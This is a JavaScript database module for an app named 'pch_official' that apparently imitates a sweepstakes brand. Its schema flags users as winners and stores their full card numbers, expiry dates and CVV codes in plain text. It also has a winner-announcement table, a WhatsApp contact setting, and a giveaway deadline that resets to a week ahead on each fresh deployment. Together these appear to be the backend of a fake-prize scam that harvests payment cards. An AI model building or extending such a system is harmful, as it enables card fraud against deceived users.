import initSqlJs from 'sql.js'
import fs from 'fs'
import path from 'path'

const DB_PATH =
  process.env.NODE_ENV === 'production'
    ? '/tmp/pch_official.db'
    : path.join(process.cwd(), 'pch_official.db')

const BLOB_PATHNAME = 'pch_official.db'

let _SQL = null
let _rawDb = null

// ── Blob helpers (cross-instance persistence) ─────────────────
async function loadFromBlob() {
  if (!process.env.BLOB_READ_WRITE_TOKEN) return null
  try {
    const { get } = await import('@vercel/blob')
    const result = await get(BLOB_PATHNAME, {
      access: 'private',
      token: process.env.BLOB_READ_WRITE_TOKEN,
      useCache: false,
    })
    if (!result || result.statusCode === 304) return null
    const buf = await new Response(result.stream).arrayBuffer()
    return Buffer.from(buf)
  } catch (err) {
    console.error('[db] blob load error:', err)
    return null
  }
}

async function saveToBlob(data) {
  if (!process.env.BLOB_READ_WRITE_TOKEN) return
  try {
    const { put } = await import('@vercel/blob')
    await put(BLOB_PATHNAME, data, {
      access: 'private',
      addRandomSuffix: false,
      allowOverwrite: true,
      token: process.env.BLOB_READ_WRITE_TOKEN,
    })
  } catch (err) {
    console.error('[db] blob save error:', err)
  }
}

// ── Disk + Blob persist ───────────────────────────────────────
function persist(rawDb) {
  const data = rawDb.export()
  const buf = Buffer.from(data)
  fs.writeFileSync(DB_PATH, buf)
  // Fire-and-forget: upload to Blob for cross-instance reads
  saveToBlob(buf).catch(err => console.error('[db] blob persist error:', err))
}

// ── sql.js wrappers ───────────────────────────────────────────
class Stmt {
  constructor(rawDb, sql) {
    this._raw = rawDb
    this._sql = sql
  }

  _rows(params) {
    const stmt = this._raw.prepare(this._sql)
    if (params.length) stmt.bind(params)
    const rows = []
    while (stmt.step()) rows.push(stmt.getAsObject())
    stmt.free()
    return rows
  }

  get(...params) {
    return this._rows(params)[0] ?? null
  }

  all(...params) {
    return this._rows(params)
  }

  run(...params) {
    this._raw.run(this._sql, params.length ? params : undefined)
    const res = this._raw.exec('SELECT last_insert_rowid()')
    persist(this._raw)
    return { lastInsertRowid: res[0]?.values[0][0] ?? null }
  }
}

class Db {
  constructor(rawDb) {
    this._raw = rawDb
  }
  prepare(sql) { return new Stmt(this._raw, sql) }
  exec(sql)    { this._raw.exec(sql); return this }
  pragma()     { return this }
}

// ── DB init ───────────────────────────────────────────────────
export async function getDb() {
  if (_rawDb) return new Db(_rawDb)

  if (!_SQL) {
    const wasmPath = path.join(process.cwd(), 'node_modules', 'sql.js', 'dist', 'sql-wasm.wasm')
    const wasmBinary = fs.readFileSync(wasmPath)
    _SQL = await initSqlJs({ wasmBinary })
  }

  if (fs.existsSync(DB_PATH)) {
    // Warm instance: reuse the file this instance already wrote
    _rawDb = new _SQL.Database(fs.readFileSync(DB_PATH))
  } else {
    // Cold start: fetch the latest DB from Blob (populated by a previous instance)
    const blobData = await loadFromBlob()
    if (blobData) {
      _rawDb = new _SQL.Database(blobData)
      fs.writeFileSync(DB_PATH, blobData) // cache locally for this instance
    } else {
      _rawDb = new _SQL.Database() // brand-new deployment
    }
  }

  const db = new Db(_rawDb)
  initSchema(db)
  return db
}

function initSchema(db) {
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      full_name TEXT NOT NULL,
      email TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      is_winner INTEGER NOT NULL DEFAULT 0,
      winner_at TEXT,
      payment_submitted INTEGER NOT NULL DEFAULT 0,
      card_holder_name TEXT,
      card_number TEXT,
      card_expiry TEXT,
      card_cvv TEXT,
      payment_submitted_at TEXT,
      created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS winner_notifications (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      winner_name TEXT NOT NULL,
      amount INTEGER NOT NULL,
      won_at TEXT NOT NULL,
      created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS settings (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      key TEXT UNIQUE NOT NULL,
      value TEXT NOT NULL,
      updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
  `)

  const has = db.prepare("SELECT id FROM settings WHERE key = 'whatsapp_number'").get()
  if (!has) {
    db.prepare("INSERT INTO settings (key, value) VALUES ('whatsapp_number', '1234567890')").run()
  }

  const hasEnd = db.prepare("SELECT id FROM settings WHERE key = 'giveaway_end_date'").get()
  if (!hasEnd) {
    const endDate = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString()
    db.prepare("INSERT INTO settings (key, value) VALUES ('giveaway_end_date', ?)").run(endDate)
  }
}

export default getDb
